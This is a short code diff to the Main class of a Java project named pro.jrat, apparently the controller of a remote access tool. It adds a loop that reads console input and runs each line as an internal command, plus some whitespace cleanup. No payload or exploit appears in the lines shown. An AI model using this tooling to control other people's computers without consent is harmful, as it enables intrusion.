@@ -1,7 +1,9 @@
 package pro.jrat;
 
+import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileOutputStream;
+import java.io.InputStreamReader;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -10,6 +12,7 @@ import javax.swing.JOptionPane;
 import javax.swing.UIManager;
 
 import pro.jrat.api.events.OnDisableEvent;
+import pro.jrat.commands.Commands;
 import pro.jrat.common.OperatingSystem;
 import pro.jrat.common.Version;
 import pro.jrat.extensions.Plugin;
@@ -98,11 +101,10 @@ public class Main {
 		}
 
 		Statistics.getGlobal().load();
-		
-		instance = new Frame();
-		
-		AbstractSettings.loadAllGlobals();
 
+		instance = new Frame();
+
+		AbstractSettings.loadAllGlobals();
 
 		boolean showEULA = Settings.getGlobal().getBoolean("showeula");
 		if (!showEULA) {
@@ -146,6 +148,13 @@ public class Main {
 				}
 			}
 		}));
+
+		BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
+		String s;
+		
+		while ((s = reader.readLine()) != null) {
+			Commands.execute(s);
+		}
 	}
 
 	public static boolean argsContains(String[] args, String s) {
